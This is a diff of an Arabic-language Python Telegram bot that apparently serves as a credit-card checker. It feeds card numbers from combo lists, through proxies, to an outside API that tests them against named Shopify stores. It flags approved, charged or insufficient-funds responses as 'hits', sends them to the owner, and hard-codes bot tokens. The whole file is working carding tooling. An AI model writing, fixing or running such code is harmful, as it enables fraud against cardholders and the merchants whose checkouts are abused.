@@ -11,7 +11,7 @@ from datetime import datetime
 from collections import defaultdict
 
 # ==================== التوكن والمتغيرات ====================
-TOKEN = '8558756991:AAH47viS7Ld5USbD2vb7m9tuQ_QWHGkBTjI'
+TOKEN = '8558756991:AAEnr1LAzeeW4dngAH59TpP7OJ-XZgub8TU'
 bot = telebot.TeleBot(TOKEN)
 bot.remove_webhook()
 
@@ -34,8 +34,7 @@ def load_sites():
     return [
         "https://makeship.com", "https://dutchwaregear.com", "https://sockbox.com",
         "https://www.nativecos.com", "https://www.tula.com", "https://drmtlgy.myshopify.com",
-        "https://www.tula.com", "https://shop.wattlogic.com", "https://grabpick.com",
-        "https://theneomag.com", "https://dominileather.com"
+        "https://university-of-waterloo.myshopify.com", "https://renovate-wallcoverings.myshopify.com"
     ]
 
 def save_sites(sites):
@@ -59,7 +58,6 @@ def load_stats():
     return {"total_checks": 0, "total_hits": 0, "total_dead": 0, "today_hits": 0, "today_date": datetime.now().strftime("%Y-%m-%d")}
 
 def save_stats(stats):
-    # reset daily stats if new day
     today = datetime.now().strftime("%Y-%m-%d")
     if stats.get("today_date") != today:
         stats["today_hits"] = 0
@@ -71,7 +69,7 @@ def load_settings():
     if os.path.exists(SETTINGS_FILE):
         with open(SETTINGS_FILE, 'r') as f:
             return json.load(f)
-    return {"delay": 1, "timeout": 25, "auto_delete_bad_sites": True, "show_full_card": False}
+    return {"delay": 1, "timeout": 25, "auto_delete_bad_sites": False, "show_full_card": False}
 
 def save_settings(settings):
     with open(SETTINGS_FILE, 'w') as f:
@@ -88,11 +86,10 @@ checking_active = False
 checking_thread = None
 current_check = {
     "live": 0, "dead": 0, "total": 0, "current": 0,
-    "last_card": "", "last_response": "", "last_site": "",
+    "last_card": "", "last_response": "", "last_site": "", "last_gateway": "",
     "hits": [], "errors": [], "cards_left": []
 }
 site_errors = defaultdict(int)
-proxy_errors = defaultdict(int)
 
 # ==================== دوال مساعدة ====================
 def make_request(site, card, proxy):
@@ -100,30 +97,15 @@ def make_request(site, card, proxy):
     url = "https://web-production-a8008.up.railway.app/shopify"
     params = {"site": site, "cc": card, "proxy": proxy}
     
-    session = requests.Session()
-    session.proxies = {'http': proxy, 'https': proxy}
-    session.headers.update({
-        'User-Agent': random.choice([
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-        ]),
-        'Accept': 'application/json',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive'
-    })
-    
     try:
         start = time.time()
-        response = session.get(url, params=params, timeout=SETTINGS.get("timeout", 25))
+        response = requests.get(url, params=params, timeout=SETTINGS.get("timeout", 25))
         elapsed = round(time.time() - start, 2)
         data = response.json()
         data["elapsed"] = elapsed
         return data
     except Exception as e:
-        return {"Status": False, "Response": f"ERROR: {str(e)[:50]}", "elapsed": 0}
-    finally:
-        session.close()
+        return {"Status": False, "Response": f"ERROR: {str(e)[:50]}", "elapsed": 0, "Gateway": "Error"}
 
 def format_card(card, show_full=False):
     """تنسيق عرض البطاقة"""
@@ -160,7 +142,6 @@ def sites_menu():
     markup.add(types.InlineKeyboardButton("➕ إضافة موقع", callback_data="add_site"))
     markup.add(types.InlineKeyboardButton("📋 قائمة المواقع", callback_data="list_sites"))
     markup.add(types.InlineKeyboardButton("🗑 حذف موقع", callback_data="delete_site"))
-    markup.add(types.InlineKeyboardButton("🧹 مسح المواقع المعطلة", callback_data="clean_sites"))
     markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
     return markup
 
@@ -175,7 +156,7 @@ def proxies_menu():
 def settings_menu():
     markup = types.InlineKeyboardMarkup(row_width=1)
     delay_status = "✅" if SETTINGS.get("delay", 1) == 1 else "⏱"
-    auto_del_status = "✅" if SETTINGS.get("auto_delete_bad_sites", True) else "❌"
+    auto_del_status = "✅" if SETTINGS.get("auto_delete_bad_sites", False) else "❌"
     show_card_status = "✅" if SETTINGS.get("show_full_card", False) else "❌"
     markup.add(types.InlineKeyboardButton(f"{delay_status} تأخير بين الطلبات: {SETTINGS.get('delay', 1)}ث", callback_data="set_delay"))
     markup.add(types.InlineKeyboardButton(f"{auto_del_status} حذف المواقع المعطلة تلقائياً", callback_data="toggle_auto_del"))
@@ -198,9 +179,7 @@ def start_cmd(m):
         bot.reply_to(m, "⛔ هذا البوت خاص بصاحبه فقط")
         return
     
-    # تحديث الإحصائيات اليومية
-    global STATS_DATA
-    STATS_DATA = load_stats()
+    STATS_DATA.update(load_stats())
     
     welcome_text = f"""
 🤖 **بوت فحص Shopify - مصطفى النجم**
@@ -215,7 +194,7 @@ def start_cmd(m):
 ━━━━━━━━━━━━━━━━━━━
 ⚙️ **الإعدادات:**
 • ⏱ تأخير: `{SETTINGS.get('delay', 1)}` ثانية
-• 🗑 حذف تلقائي: `{'نعم' if SETTINGS.get('auto_delete_bad_sites', True) else 'لا'}`
+• 🗑 حذف تلقائي: `{'نعم' if SETTINGS.get('auto_delete_bad_sites', False) else 'لا'}`
 
 ━━━━━━━━━━━━━━━━━━━
 💬 أرسل كومبو أو ملف .txt لبدء الفحص
@@ -270,50 +249,6 @@ def sites_list_cmd(m):
         return
     show_sites_list(m.chat.id)
 
-@bot.message_handler(commands=['delsite'])
-def del_site_cmd(m):
-    if m.from_user.id != OWNER_ID:
-        return
-    args = m.text.split()
-    if len(args) != 2:
-        bot.reply_to(m, "❌ استخدم: /delsite [الموقع]")
-        return
-    site = args[1]
-    if site in SITES_LIST:
-        SITES_LIST.remove(site)
-        save_sites(SITES_LIST)
-        bot.reply_to(m, f"✅ تم حذف: `{site}`", parse_mode="Markdown")
-    else:
-        bot.reply_to(m, "❌ الموقع غير موجود")
-
-@bot.message_handler(commands=['clean'])
-def clean_sites_cmd(m):
-    if m.from_user.id != OWNER_ID:
-        return
-    # فحص جميع المواقع وحذف المعطلة
-    bot.reply_to(m, "🔄 جاري فحص المواقع...")
-    working = []
-    dead = []
-    
-    for site in SITES_LIST:
-        try:
-            res = requests.get(site, timeout=10)
-            if res.status_code < 400:
-                working.append(site)
-            else:
-                dead.append(site)
-        except:
-            dead.append(site)
-    
-    if dead:
-        for site in dead:
-            if site in SITES_LIST:
-                SITES_LIST.remove(site)
-        save_sites(SITES_LIST)
-        bot.reply_to(m, f"✅ تم حذف {len(dead)} موقع معطل\n🗑 {', '.join(dead[:5])}")
-    else:
-        bot.reply_to(m, "✅ جميع المواقع تعمل بشكل جيد")
-
 @bot.message_handler(content_types=['document', 'text'])
 def handle_input(m):
     if m.from_user.id != OWNER_ID:
@@ -347,7 +282,7 @@ def handle_input(m):
     global current_check
     current_check = {
         "live": 0, "dead": 0, "total": total_cards, "current": 0,
-        "last_card": "", "last_response": "", "last_site": "",
+        "last_card": "", "last_response": "", "last_site": "", "last_gateway": "",
         "hits": [], "errors": [], "cards_left": cards.copy()
     }
     site_errors.clear()
@@ -366,7 +301,7 @@ def handle_input(m):
     checking_thread = threading.Thread(target=run_checking, args=(m.chat.id, msg.message_id, cards))
     checking_thread.start()
 
-# ==================== وظيفة الفحص الرئيسية ====================
+# ==================== وظيفة الفحص الرئيسية (المعدلة) ====================
 def run_checking(chat_id, msg_id, cards):
     global checking_active, current_check, STATS_DATA
     
@@ -392,79 +327,82 @@ def run_checking(chat_id, msg_id, cards):
         try:
             data = make_request(site, card, proxy)
             response_msg = str(data.get("Response", "N/A")).upper()
-            elapsed = data.get("elapsed", 0)
-            status = data.get("Status", False)
+            elapsed = data.get("Time", data.get("elapsed", 0))
+            gateway = data.get("Gateway", "Shopify")
             
             current_check["last_response"] = response_msg
+            current_check["last_gateway"] = gateway
             
-            success_keys = ["APPROVED", "SUCCESS", "FUNDS", "CHARGED", "DS_REQUIRED", "AUTHENTICATE", "AUTHORIZED", "INSUFFICIENT"]
-            is_live = status == True or any(k in response_msg for k in success_keys)
+            # ✅ التصحيح الحقيقي: تعريف Hit يعتمد على Response
+            hit_keywords = ["APPROVED", "SUCCESS", "FUNDS", "CHARGED", "AUTH", "INSUFFICIENT", "CVV", "PENDING", "Empty submit"]
+            is_hit = any(k in response_msg for k in hit_keywords)
             
-            if is_live:
+            # ========== تقييم النتيجة ==========
+            if is_hit:
                 current_check["live"] += 1
                 STATS_DATA["total_hits"] += 1
                 STATS_DATA["today_hits"] += 1
+                STATS_DATA["total_checks"] += 1
                 save_stats(STATS_DATA)
                 
                 hit_msg = f"""
-🎯 **HIT / APPROVED**
+🎯 **HIT / GOOD CARD**
 ━━━━━━━━━━━━━━━━━━━
 💳 **CC:** `{card}`
-📝 **Response:** `{response_msg}`
-🌐 **Site:** `{site}`
+🌐 **Gateway:** `{gateway}`
+📝 **Response:** `{response_msg[:60]}`
 ⏱ **Time:** `{elapsed}s`
+🌍 **Site:** `{site}`
 ━━━━━━━━━━━━━━━━━━━
 ✅ مصطفى النجم 🇮🇶
 """
                 bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
-                current_check["hits"].insert(0, {"card": card, "response": response_msg, "site": site, "time": elapsed})
+                
+                current_check["hits"].insert(0, {"card": card, "response": response_msg, "site": site, "time": elapsed, "gateway": gateway})
                 if len(current_check["hits"]) > 20:
                     current_check["hits"].pop()
             else:
                 current_check["dead"] += 1
+                STATS_DATA["total_checks"] += 1
+                save_stats(STATS_DATA)
                 
-                # حذف المواقع المعطلة تلقائياً
-                if SETTINGS.get("auto_delete_bad_sites", True):
-                    if "TIMEOUT" in response_msg or "CONNECTION" in response_msg or "500" in response_msg:
-                        site_errors[site] += 1
-                        if site_errors[site] >= 2 and site in SITES_LIST:
-                            SITES_LIST.remove(site)
-                            save_sites(SITES_LIST)
-                            bot.send_message(chat_id, f"⚠️ تم حذف الموقع المعطل: `{site}`", parse_mode="Markdown")
-                
-                # تسجيل الأخطاء
-                if "ERROR" in response_msg or "TIMEOUT" in response_msg:
-                    error_msg = f"{card[:12]}***: {response_msg[:40]}"
-                    current_check["errors"].insert(0, error_msg)
-                    if len(current_check["errors"]) > 20:
-                        current_check["errors"].pop()
+                # فقط إذا كان خطأ اتصال حقيقي، سجل خطأ (لا تحذف الموقع)
+                if "CONNECTION" in response_msg or "TIMEOUT" in response_msg or "ERROR" in response_msg:
+                    error_entry = f"{card[:12]}***: {response_msg[:40]}"
+                    if error_entry not in current_check["errors"]:
+                        current_check["errors"].insert(0, error_entry)
+                        if len(current_check["errors"]) > 15:
+                            current_check["errors"].pop()
             
             # تحديث شاشة التقدم
             if (idx + 1) % 3 == 0 or (idx + 1) == len(cards):
-                progress = int((idx + 1) / len(cards) * 100)
+                progress = int((idx + 1) / len(cards) * 100) if cards else 0
                 try:
                     bot.edit_message_text(f"""
 🚀 **فحص Shopify - مصطفى النجم**
 ━━━━━━━━━━━━━━━━━━━
 📊 **التقدم:** [{idx+1}/{len(cards)}] ({progress}%)
-✅ **Approved:** `{current_check['live']}`
+✅ **Hits:** `{current_check['live']}`
 ❌ **Declined:** `{current_check['dead']}`
 ━━━━━━━━━━━━━━━━━━━
 💳 **آخر بطاقة:** `{format_card(card)}`
-📝 **الرد:** `{current_check['last_response'][:35]}`
-🌐 **الموقع:** `{site[:30]}`
+🌐 **Gateway:** `{gateway}`
+📝 **الرد:** `{response_msg[:35]}`
 ━━━━━━━━━━━━━━━━━━━
 🌐 **مواقع نشطة:** `{len(SITES_LIST)}`
 🔌 **بروكسيات:** `{len(PROXIES_LIST)}`
 ━━━━━━━━━━━━━━━━━━━
 ⚡ @o8380
 """, chat_id, msg_id, parse_mode="Markdown", reply_markup=checking_screen())
-                except:
+                except Exception:
                     pass
             
         except Exception as e:
             current_check["dead"] += 1
-            current_check["errors"].insert(0, f"{card}: {str(e)[:40]}")
+            error_msg = str(e)[:50]
+            current_check["errors"].insert(0, f"{card[:10]}...: {error_msg}")
+            if len(current_check["errors"]) > 15:
+                current_check["errors"].pop()
         
         # تأخير بين الطلبات
         time.sleep(SETTINGS.get("delay", 1))
@@ -472,13 +410,14 @@ def run_checking(chat_id, msg_id, cards):
     checking_active = False
     
     # التقرير النهائي
-    hit_rate = round(current_check['live'] / len(cards) * 100, 1) if cards else 0
+    total_checked = len(cards)
+    hit_rate = round(current_check['live'] / total_checked * 100, 1) if total_checked else 0
     final_report = f"""
 🏁 **تقرير الفحص النهائي**
 ━━━━━━━━━━━━━━━━━━━
-📊 **إجمالي البطاقات:** `{len(cards)}`
+📊 **إجمالي البطاقات:** `{total_checked}`
 ✅ **Hits:** `{current_check['live']}`
-❌ **Dead:** `{current_check['dead']}`
+❌ **Declined:** `{current_check['dead']}`
 📈 **نسبة النجاح:** `{hit_rate}%`
 ━━━━━━━━━━━━━━━━━━━
 🌐 **المواقع المتبقية:** `{len(SITES_LIST)}`
@@ -491,19 +430,18 @@ def run_checking(chat_id, msg_id, cards):
     if current_check["hits"]:
         hits_text = "📋 **آخر الهيتات:**\n━━━━━━━━━━━━━━━━━━━\n"
         for hit in current_check["hits"][:5]:
-            hits_text += f"🎯 `{format_card(hit['card'])}` → {hit['response'][:20]}\n"
+            hits_text += f"🎯 `{format_card(hit['card'])}`\n📝 {hit['response'][:30]}\n🌐 {hit['gateway']}\n━━━━━━━━━━━━━━━━━━━\n"
         bot.send_message(chat_id, hits_text, parse_mode="Markdown")
 
 # ==================== دوال عرض المعلومات ====================
 def show_stats_message(chat_id):
-    hit_rate = 0
-    if STATS_DATA["total_checks"] > 0:
-        hit_rate = round(STATS_DATA["total_hits"] / STATS_DATA["total_checks"] * 100, 1)
+    total_checks = STATS_DATA.get("total_checks", 0)
+    hit_rate = round(STATS_DATA["total_hits"] / total_checks * 100, 1) if total_checks > 0 else 0
     
     text = f"""
 📊 **الإحصائيات العامة**
 ━━━━━━━━━━━━━━━━━━━
-🔢 إجمالي الفحوصات: `{STATS_DATA['total_checks']}`
+🔢 إجمالي الفحوصات: `{total_checks}`
 🎯 إجمالي الهيتات: `{STATS_DATA['total_hits']}`
 📈 نسبة النجاح الكلية: `{hit_rate}%`
 ━━━━━━━━━━━━━━━━━━━
@@ -540,7 +478,7 @@ def show_proxies_list(chat_id):
 # ==================== معالجة الأزرار ====================
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    global checking_active, STATS_DATA, SETTINGS
+    global checking_active, SETTINGS
     
     if call.data == "start_check":
         bot.answer_callback_query(call.id, "📁 أرسل الكومبو أو ملف .txt")
@@ -549,36 +487,63 @@ def callback_handler(call):
     elif call.data == "stop_check":
         checking_active = False
         bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
-        bot.edit_message_text("⏹ تم إيقاف الفحص", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        try:
+            bot.edit_message_text("⏹ تم إيقاف الفحص", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        except:
+            pass
     
     elif call.data == "show_stats":
         show_stats_message(call.message.chat.id)
-        bot.delete_message(call.message.chat.id, call.message.message_id)
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
     
     elif call.data == "manage_sites":
-        bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
+        try:
+            bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
+        except:
+            pass
     
     elif call.data == "manage_proxies":
-        bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
+        try:
+            bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
+        except:
+            pass
     
     elif call.data == "settings":
-        bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
+        try:
+            bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
+        except:
+            pass
     
     elif call.data == "list_sites":
         show_sites_list(call.message.chat.id)
-        bot.delete_message(call.message.chat.id, call.message.message_id)
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
     
     elif call.data == "list_proxies":
         show_proxies_list(call.message.chat.id)
-        bot.delete_message(call.message.chat.id, call.message.message_id)
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
     
     elif call.data == "add_site":
         bot.send_message(call.message.chat.id, "🌐 أرسل رابط الموقع:")
-        bot.delete_message(call.message.chat.id, call.message.message_id)
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
     
     elif call.data == "add_proxy":
         bot.send_message(call.message.chat.id, "🔌 أرسل البروكسي:")
-        bot.delete_message(call.message.chat.id, call.message.message_id)
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
     
     elif call.data == "delete_site":
         if SITES_LIST:
@@ -586,7 +551,10 @@ def callback_handler(call):
             for site in SITES_LIST[:15]:
                 markup.add(types.InlineKeyboardButton(f"🗑 {site[:35]}", callback_data=f"del_site_{site}"))
             markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_sites"))
-            bot.edit_message_text("🗑 **اختر موقعاً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
+            try:
+                bot.edit_message_text("🗑 **اختر موقعاً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
+            except:
+                pass
         else:
             bot.answer_callback_query(call.id, "❌ لا توجد مواقع")
     
@@ -597,35 +565,18 @@ def callback_handler(call):
                 short = proxy[:40] + "..." if len(proxy) > 40 else proxy
                 markup.add(types.InlineKeyboardButton(f"🗑 {short}", callback_data=f"del_proxy_{i}"))
             markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_proxies"))
-            bot.edit_message_text("🗑 **اختر بروكسياً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
+            try:
+                bot.edit_message_text("🗑 **اختر بروكسياً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
+            except:
+                pass
         else:
             bot.answer_callback_query(call.id, "❌ لا توجد بروكسيات")
-    
-    elif call.data == "clean_sites":
-        bot.answer_callback_query(call.id, "🔄 جاري التنظيف...")
-        working = []
-        dead = []
-        for site in SITES_LIST:
-            try:
-                r = requests.get(site, timeout=10)
-                if r.status_code < 400:
-                    working.append(site)
-                else:
-                    dead.append(site)
-            except:
-                dead.append(site)
-        for site in dead:
-            if site in SITES_LIST:
-                SITES_LIST.remove(site)
-        save_sites(SITES_LIST)
-        bot.answer_callback_query(call.id, f"✅ تم حذف {len(dead)} موقع معطل")
-        bot.edit_message_text("🌐 **تم التنظيف**\n━━━━━━━━━━━━━━━━━━━\n" + f"🗑 تم حذف {len(dead)} موقع", call.message.chat.id, call.message.message_id, reply_markup=sites_menu())
     
     elif call.data == "last_hits":
         if current_check["hits"]:
             text = "📋 **آخر الهيتات:**\n━━━━━━━━━━━━━━━━━━━\n"
             for hit in current_check["hits"][:10]:
-                text += f"🎯 `{format_card(hit['card'])}`\n📝 {hit['response'][:30]}\n🌐 {hit['site'][:30]}\n━━━━━━━━━━━━━━━━━━━\n"
+                text += f"🎯 `{format_card(hit['card'])}`\n📝 {hit['response'][:35]}\n🌐 {hit['gateway']}\n━━━━━━━━━━━━━━━━━━━\n"
             bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
         else:
             bot.answer_callback_query(call.id, "❌ لا توجد هيتات بعد")
@@ -642,19 +593,28 @@ def callback_handler(call):
     elif call.data == "set_delay":
         msg = bot.send_message(call.message.chat.id, "⏱ أدخل وقت التأخير بالثواني (1-10):")
         bot.register_next_step_handler(msg, set_delay_value)
-        bot.delete_message(call.message.chat.id, call.message.message_id)
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
     
     elif call.data == "toggle_auto_del":
-        SETTINGS["auto_delete_bad_sites"] = not SETTINGS.get("auto_delete_bad_sites", True)
+        SETTINGS["auto_delete_bad_sites"] = not SETTINGS.get("auto_delete_bad_sites", False)
         save_settings(SETTINGS)
-        bot.answer_callback_query(call.id, f"✅ تغيير: {'تشغيل' if SETTINGS['auto_delete_bad_sites'] else 'إيقاف'}")
-        bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
+        bot.answer_callback_query(call.id, f"✅ {'تشغيل' if SETTINGS['auto_delete_bad_sites'] else 'إيقاف'}")
+        try:
+            bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
+        except:
+            pass
     
     elif call.data == "toggle_show_card":
         SETTINGS["show_full_card"] = not SETTINGS.get("show_full_card", False)
         save_settings(SETTINGS)
         bot.answer_callback_query(call.id, f"✅ عرض البطاقة: {'كامل' if SETTINGS['show_full_card'] else 'مخفي'}")
-        bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
+        try:
+            bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
+        except:
+            pass
     
     elif call.data.startswith("del_site_"):
         site = call.data[9:]
@@ -662,7 +622,10 @@ def callback_handler(call):
             SITES_LIST.remove(site)
             save_sites(SITES_LIST)
             bot.answer_callback_query(call.id, "✅ تم الحذف")
-            bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
+            try:
+                bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
+            except:
+                pass
     
     elif call.data.startswith("del_proxy_"):
         idx = int(call.data[10:])
@@ -670,17 +633,26 @@ def callback_handler(call):
             PROXIES_LIST.pop(idx)
             save_proxies(PROXIES_LIST)
             bot.answer_callback_query(call.id, "✅ تم الحذف")
-            bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
+            try:
+                bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
+            except:
+                pass
     
     elif call.data == "refresh_check":
         bot.answer_callback_query(call.id, "🔄 تم التحديث")
     
     elif call.data == "refresh":
         bot.answer_callback_query(call.id, "🔄 تم التحديث")
-        bot.edit_message_text("✅ تم التحديث", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        try:
+            bot.edit_message_text("✅ تم التحديث", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        except:
+            pass
     
     elif call.data == "back":
-        bot.edit_message_text("✅ الرئيسية", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        try:
+            bot.edit_message_text("✅ الرئيسية", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        except:
+            pass
 
 def set_delay_value(m):
     try:
